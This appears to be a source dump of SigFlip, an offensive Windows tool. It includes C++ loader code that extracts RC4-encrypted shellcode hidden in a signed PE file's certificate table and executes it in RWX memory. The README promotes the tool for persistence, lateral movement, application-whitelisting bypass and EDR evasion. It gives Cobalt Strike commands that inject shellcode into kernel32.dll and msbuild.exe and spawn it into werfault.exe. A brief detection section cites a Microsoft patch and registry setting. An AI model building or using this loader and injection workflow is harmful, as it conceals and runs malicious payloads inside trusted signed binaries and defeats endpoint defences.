    <ClCompile Include="Helper.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="SigFlip.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Native/SigFlip/SigFlip/SigFlip.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SigFlip.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Helper.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SigFlip.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Helper.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`Native/SigFlip/SigFlip/SigFlip.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LocalDebuggerCommandArguments>-i C:\Windows\System32\kernel32.dll C:\Users\Test\shellcode.bin C:\Users\Test\Desktop\kernel32.dll TestSecretKey</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>-b "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe" "C:\Users\Test\Desktop\msbuild.exe"</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>

```

`Native/SigFlip/SigFlip/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`Native/SigFlip/SigFlip/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`Native/SigLoader/SigLoader.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28010.2003
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SigLoader", "SigLoader\SigLoader.vcxproj", "{CE25F925-4104-4824-9A21-63337C56B988}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{CE25F925-4104-4824-9A21-63337C56B988}.Debug|x64.ActiveCfg = Debug|x64
		{CE25F925-4104-4824-9A21-63337C56B988}.Debug|x64.Build.0 = Debug|x64
		{CE25F925-4104-4824-9A21-63337C56B988}.Debug|x86.ActiveCfg = Debug|Win32
		{CE25F925-4104-4824-9A21-63337C56B988}.Debug|x86.Build.0 = Debug|Win32
		{CE25F925-4104-4824-9A21-63337C56B988}.Release|x64.ActiveCfg = Release|x64
		{CE25F925-4104-4824-9A21-63337C56B988}.Release|x64.Build.0 = Release|x64
		{CE25F925-4104-4824-9A21-63337C56B988}.Release|x86.ActiveCfg = Release|Win32
		{CE25F925-4104-4824-9A21-63337C56B988}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D7E4078D-13BA-44CD-A51F-C3C78D4AEA2F}
	EndGlobalSection
EndGlobal

```

`Native/SigLoader/SigLoader/Helper.cpp`:

```cpp
#include "Helper.h"

void decrypt(unsigned char* data, long dataLen, unsigned char* key, long keyLen, unsigned char* result) {
	unsigned char T[256];
	unsigned char S[256];
	unsigned char  tmp;
	int j = 0, t = 0, i = 0;


	for (int i = 0; i < 256; i++) {
		S[i] = i;
		T[i] = key[i % keyLen];
	}

	for (int i = 0; i < 256; i++) {
		j = (j + S[i] + T[i]) % 256;
		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;
	}
	j = 0;
	for (int x = 0; x < dataLen; x++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;

		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;

		t = (S[i] + S[j]) % 256;

		result[x] = data[x] ^ S[t];
	}
}

BOOL IsWow64(HANDLE pHandle)
{
	BOOL isWow64 = FALSE;

	typedef BOOL(WINAPI *PFNIsWow64Process) (HANDLE, PBOOL);
	PFNIsWow64Process _FNIsWow64Process;
	_FNIsWow64Process = (PFNIsWow64Process)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (NULL != _FNIsWow64Process) {
		if (!_FNIsWow64Process(pHandle, &isWow64)) {}
	}
	return isWow64;
}
```

`Native/SigLoader/SigLoader/Helper.h`:

```h
#ifndef _HELPER_
#define _HELPER_

#pragma comment(lib, "dbghelp.lib") 

#include <stdio.h>
#include <windows.h>
#include <DbgHelp.h>
#include <WinTrust.h>
#include <time.h>

extern void decrypt(unsigned char* data, long dataLen, unsigned char* key, long keyLen, unsigned char* result);
extern BOOL IsWow64(HANDLE pHandle);

#endif 
```

`Native/SigLoader/SigLoader/SigLoader.cpp`:

```cpp
#include <Windows.h>
#include <stdio.h>
#include "Helper.h"

/*
SigLoader.exe "C:\Temp\kernel32.dll" uu37WEi2lJNQO1N

[+]:Encrypted/Encoded Data Size for calc.bin: 232 (includes padding + tag '0xfeedface0xfeedface')
[+]:Extra Padding: 4
[+]:Encrypion Key: uu37WEi2lJNQO1N

Keep in mind:
x86 Shellcode -> x86 Loader
x64 Shellcode -> x64 Loader
*/

#define MAX_PATH_LENGTH 255

void main(int argc, char* argv[]) {

	printf("\n[*]: Basic Loader...\n\n");

	//Parsing arguments
	if (argc != 3) {
		printf("[!]: Missing PE path or Encryption Key...\n");
		printf("[!]: Usage: %s <PE_PATH> <Encryption_Key>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	CHAR _fPath[MAX_PATH_LENGTH] = {};
	HANDLE HThread = INVALID_HANDLE_VALUE;
	CHAR* _encKey = argv[2];
	DWORD _encryptedDataSize = 0;
	DWORD _dataOffset = 0;
	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert = {};
	CHAR* _decryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	LPVOID shellcode = NULL;
	BYTE* _pePtr = NULL;
	PIMAGE_DOS_HEADER _dosHeader = {};
	PIMAGE_NT_HEADERS _ntHeader = {};
	IMAGE_OPTIONAL_HEADER _optHeader = {};
	DWORD _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	SIZE_T _index = 0;

	//Loading PE File
	memcpy_s(&_fPath, MAX_PATH_LENGTH, argv[1], MAX_PATH_LENGTH);
	printf("[*]: Loading/Parsing PE File '%s'\n", _fPath);
	_fHandle = CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		exit(EXIT_FAILURE);
	}


	_fSize = GetFileSize(_fHandle, NULL);
	_peBlob = (char*) malloc(_fSize);
	ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);

	if (_bytesRead == 0) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		goto _Exit;
	}
	
	_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		fprintf(stderr, "[!]: '%s' is not a valid PE file\n", _fPath);
		goto _Exit;
	}

	_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
	_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;

	if (IsWow64(GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}
	else {
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

	printf("[+]: Certificate Table RVA %x\n", _CertTableRVA);
	printf("[+]: Certificate Table Size %d\n", _CertTableSize);

	//Linear search for 0xfeedface0xfeedface tag
	_pePtr = ((BYTE*)_peBlob + _CertTableRVA);
	for (_index = 0; _index < _CertTableSize; _index++) {
		if (*(_pePtr + _index) == 0xfe && *(_pePtr + _index + 1) == 0xed && *(_pePtr + _index + 2) == 0xfa && *(_pePtr + _index + 3) == 0xce) {
			printf("[*]: Tag Found 0x%x%x%x%x", *(_pePtr + _index), *(_pePtr + _index+1), *(_pePtr + _index+2), *(_pePtr + _index+3));
			_dataOffset = _index + 8;
			break;
		}
	}

	if (_dataOffset != _index + 8) {
		fprintf(stderr, "[!]: Could not locate data/shellcode");
		goto _Exit;
	}

	//Decrypting
	_encryptedDataSize = _CertTableSize - _dataOffset;
	_decryptedData = (CHAR*)malloc(_encryptedDataSize);
	memcpy(_decryptedData, _pePtr + _dataOffset, _encryptedDataSize);
	decrypt((unsigned char*)_decryptedData, _encryptedDataSize, (unsigned char*)_encKey, strlen(_encKey), (unsigned char*)_decryptedData);
	printf("\n[+]: Encrypted/Decrypted Data Size %d\n", _encryptedDataSize);

	//Execute shellcode (just a basic/vanilla local shellcode injection logic, You can use other techniques)
	//Customize the following as you see fit.
	shellcode = VirtualAlloc(NULL, _encryptedDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(GetCurrentProcess(), shellcode, _decryptedData, _encryptedDataSize, NULL);
	HThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)shellcode, 0, 0, 0);
	WaitForSingleObject(HThread, 0xFFFFFFFF);

_Exit:
	if (_peBlob) free(_peBlob);
	if (_decryptedData) free(_decryptedData);
	CloseHandle(_fHandle);

}
```

`Native/SigLoader/SigLoader/SigLoader.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{CE25F925-4104-4824-9A21-63337C56B988}</ProjectGuid>
    <RootNamespace>SigLoader</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Helper.cpp" />
    <ClCompile Include="SigLoader.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Helper.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Native/SigLoader/SigLoader/SigLoader.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="SigLoader.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Helper.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Helper.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Native/SigLoader/SigLoader/SigLoader.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LocalDebuggerCommandArguments>"C:\Users\Test\Desktop\kernel32.dll" TestSecret</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>

```

`README.md`:

```md
### What is it ?

SigFlip is a tool for patching authenticode signed PE files (exe, dll, sys ..etc) in a way that doesn't affect or break the existing authenticode signature, in other words you can change PE file checksum/hash by embedding data (i.e shellcode) without breaking the file signature, integrity checks or PE file functionality.

SigInject encrypts and injects shellcode into a PE file's [WIN_CERTIFICATE] certificate table, the encryption key is printed out for usage with a basic BOF/C/C# loader (SigLoader), SigInject saves changes to a modified PE file and keeps its signature and certificate validity intact.

SigLoader is a basic loader which takes a modified PE file path created by SigInject and the decryption key as parameters, then extract and decrypt embedded shellcode for usage with a shellcode injection of choice.

SigFlip will check if PE hash was successfully changed and also check and exit gracefully in case endpoints are hardened against such common misconfiguration. (check "Details" section).

**Quick Note:** SigFlip, SigInject and SigLoader are available as BOF scripts and .NET assemblies, the only difference is that SigInject functionality is implemented as part of SigFlip (-i) in case if you choose to use .NET artifacts instead of BOFs.

### Why ?

It can be used mainly for persistence, lateral movement or code/command execution and can help with:

* Application whitelisting bypasses, changing the PE file hash (msbuild.exe for ex) without breaking the signature.
* Bypassing EDRs relying on specific LOLBINs' hashes for malicious code/command execution detection.
* Load signed drivers using a different hash, might help circumvent any EDRs watching for common vulnerable signed drivers using a pre-defined list of hashes.
* Embed encrypted shellcode in a signed PE file and use a stager (sigloader) of your preference to parse, decrypt, load and execute it.
* Endpoint security vendors tend to classify signed PE files as benign most of the time, embedding your unsigned code (shellcode ..etc.) in a signed PE file makes it a little bit hard to detect/flag.
* Bypassing endpoint security vendors relying mainly on the default WinVerifyTrust for signature validation.
* Improving OPSEC and challenging defenders relying solely on typical signature verification utilities such as signtool, sigcheck, Get-AuthenticodeSignature ..etc to validate the authenticoode signature of PE files.

### Usage & Examples:

#### Compile/Build:

Precompiled BOF's are not provided in this project, can be compiled using Mingw-w64, for **.NET** use VS or csc.exe to compile .NET projects (SigFlip, SigLoader), for **BOF** check steps below;

* `➜ i686-w64-mingw32-gcc -c sigflip.c -o sigflip.x86.o`
* `➜ x86_64-w64-mingw32-gcc -c sigflip.c -o sigflip.x64.o`
* `➜ x86_64-w64-mingw32-gcc -c SigLoader/sigloader.c -o sigloader.x64.o`
* `➜ i686-w64-mingw32-gcc -c SigLoader/sigloader.c -o sigloader.x86.o`

Make sure all object files are located in the same directory as sigflip.cna, then load sigflip.cna script to cobalt strike.

**Quick Note:** pre-compiled BOFs were tested and compatible with mingw-64 v8.0.0_3, **using mingw-64 >= v9 might work but might crash active beacons**, check https://github.com/med0x2e/SigFlip/issues/2 for more details.
	
#### Cobalt Strike:
1. **Execute-Assembly**
	* `execute-assembly SigFlip.exe -h`
	* `execute-assembly SigLoader -h`
2. **BOF**
	* For usage with cobalt strike, once you load the SigFlip.cna script, two new commands will be registered; SigFlip and SigInject, then use as below;
		* SigFlip: Change a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature or the validity of the certificate:
			* `SigFlip "<PE\_FILE\_PATH>" "<OUTPUT\_PE\_FILE\_PATH (with extension)>"`
		
		* SigInject: Encrypts and Injects shellcode into a PE file's \[WIN\_CERTIFICATE\] certificate table, encryption key is printed out for usage with a basic C/C# loader plus keeps the signature and certificate validity intact:
			* `SigInject "<PE\_FILE\_PATH> <OUTPUT\_PE\_FILE\_PATH (with extension)>" "<SHELLCODE\_FILE>"`

        * SigLoader: Loads encrypted shellcode from PE files created by SigInject, then use Early Bird queueuserapc to spawn/inject sc into a sacrificial process, shellcode injection logic can be customized or replaced with any other code injection technique of choice:
            * `SigLoader <PE_FILE_PATH_WITH_SH> <DECRYPTION_KEY> <SPAWNTO_PROCESS_PATH> <PARENT_PROCESS_ID>`
3. **Examples**

    * BOF:
        * Inject random data to msbuild.exe (aka bit flip msbuild.exe): 
            * `SigFlip "C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe" "C:\lolbins\modified-msbuild.exe"`
        * Inject shellcode to kernel32.dll (Arguments order is different & make sure to take note of the decryption key):
            * `SigInject "C:\Windows\System32\kernel32.dll" "C:\random\modified-kernel32.dll" "C:\shellcode\cobaltstrike_or_msf_shellcode.bin"`
            * `Sigloader "C:\random\modified-kernel32.dll" "DECRYPTION_KEY" "C:\Windows\System32\werfault.exe" 6300`

    * Execute-Assembly:

        * Inject random data to msbuild.exe: 
            * `execute-assembly SigFlip.exe -b C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -o C:\Temp\MSBuild.exe`
        * Inject shellcode to kernel32.dll (Arguments order is different & make sure to take note of the decryption key):
            * `execute-assembly SigFlip.exe -i C:\Windows\System32\kernel32.dll -s C:\Temp\x86shellcode.bin -o C:\Temp\kernel32.dll -e TestSecretKey`
            * `execute-assembly SigLoader.exe -f C:\Temp\modified-kernel32.dll -e TestSecretKey -pid 2354`

---

## Details:

This is a known technique used by APT#10 in multiple campaigns or intrusion sets.

### Authenticode Digital Signatures ?

Authenticode is a Microsoft code-signing technology that identifies the publisher of Authenticode-signed software. Authenticode also verifies that the software has not been tampered with since it was signed and published.

### How does it work ?

Microsoft relies mainly on Authenticode signing format for verifying the integrity and the origin of PE binaries, according to the Authenticode Portable Executable format specification the Authenticode signatures can be “embedded” in a Windows PE file, in a location specified by the Certificate Table entry in Optional Header Data Directories. When Authenticode is used to sign a Windows PE file, the algorithm that calculates the file’s Authenticode hash value excludes certain PE fields. When embedding the signature in the file, **the signing process can modify these fields without affecting the file’s hash value**. These fields are as follows: **the checksum, certificate table RVA, certificate table size and the **attribute certificate table**. The attribute certificate table contains a PKCS #7 SignedData structure containing the PE file’s **hash value**, a **signature** created by the software publisher’s private key, and the **X.509 v3 certificates** that bind the software publisher’s signing key to a legal entity.

In layman's terms, we can modify or embed data into fields execulded from the authenticode hash calculation without worrying about breaking the authenticode signature and file integrity checks.

More details about such excluded fields: 
* Certificate table RVA and Size: A signed PE file optional header structure contains an array of data directories including the security directory **IMAGE_DIRECTORY_ENTRY_SECURITY** entry which has two fields, **RVA** and **Size**.
	* RVA: a file offset (not a memory offset) to the attribute certificate table.
	* Size: attribute certificate table size.

* Attribute Certificate Table: a data structure **WIN_CERTIFICATE** which encapsulate the signature and certificates and has the following fields:
	-   `dwLength`: certificate table size.
	-   `wRevision`: the “revision” of the `WIN_CERTIFICATE`.
	-   `wCertificateType`: the kind of encapsulated certificate data.
	-   `bCertificate`: the actual certificate data. For `WIN_CERT_TYPE_PKCS_SIGNED_DATA`, this is the PKCS#7 `SignedData` structure mentionned above (which contains the PE hash value, signature and x.509 certificate), this is exactly where SigFlip embed randm random data or shellcode.

With all of that in mind, now SifFlip does the following:
1. Check system configuration
2. Loading PE File & Verifying PE file signature  & Compute Sha1 hash
1. Get "e\_lfanew" offset (pointing to the PE FILE HEADER -> IMAGE\_NT\_HEADERS)
2. Get IMAGE\_OPTIONAL\_HEADER from IMAGE\_NT\_HEADERS
3. Get IMAGE\_DATA\_DIRECTORY from IMAGE\_OPTIONAL\_HEADER
4. Get IMAGE\_DIRECTORY\_ENTRY\_SECURITY field and retrieve the RVA and SIZE of the Attribute Certificate Table (WIN\_CERTIFICATE).
5. Patch the PE File blob by padding the Certificate Table with extra bytes (random/shellcode) of choice.
6. Update the optional header -> IMAGE\_DIRECTORY\_ENTRY\_SECURITY data directory Size
7. Update WIN\_CERTIFICATE (Certificate Table) dwLength
8. Generate the new PE cheksum and update it. (OPT Header Checksum)
9. Save the final PE with new size.
10. Verify modified PE file signature

The first step is essential to confirm if the system is misconfigured in a way to allow padding and injecting shellcode into authenticode signed PE files, therefore the following sanity checks are performed:
	      
1. Check if MS13-098 fix is not installed (KB2893294), Keep in mind **IT COULD BE INSTALLED BUT REGISTRY KEYS ARE NOT PROPERLY SET, WHICH RENDERS THE PATCH USELESS**
2. Check Registry keys
	1. X86:
		*  Check if registry key "HKLM:\\Software\\Microsoft\\Cryptography\\Wintrust\\Config" is not available
			*  -> if available then check if "EnableCertPaddingCheck" registry value is not available

	1. X64:
		* Check if registry key "HKLM:\\Software\\Wow6432Node\\Microsoft\\Cryptography\\Wintrust\\Config" is not available
			* -> if available then check if "EnableCertPaddingCheck" registry value is not available.


#### Why cannot read the injected data when the modified PE is loaded as a module into its own address space or the address space of other processes ?

Windows loader doesn't load certificate data into the process address space, reason why you need a custom loader to extract data such as shellcode and use it (ex: SigLoader). this should also explain why **IMAGE_DIRECTORY_ENTRY_SECURITY** data directory entry RVA is a file offset instead of a typical memory offset.


### Detect/Prevent:
* https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2014/2915720?redirectedfrom=MSDN
* Once the patch is installed and proper registry keys are set, No system restarts are required, you only need to restart the Cryptographic Services. The Applocker service will be also restarted as it depends on the cryptographic services.(@p0w3rsh3ll)
* Yara rule by Adrien; https://twitter.com/Int2e_/status/1330975808941330432


### References

* https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2013/ms13-098?redirectedfrom=MSDN
*  https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2014/2915720?redirectedfrom=MSDN
* http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/authenticode_pe.docx 
* https://msrc-blog.microsoft.com/2013/12/10/ms13-098-update-to-enhance-the-security-of-authenticode/
* https://www.specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf
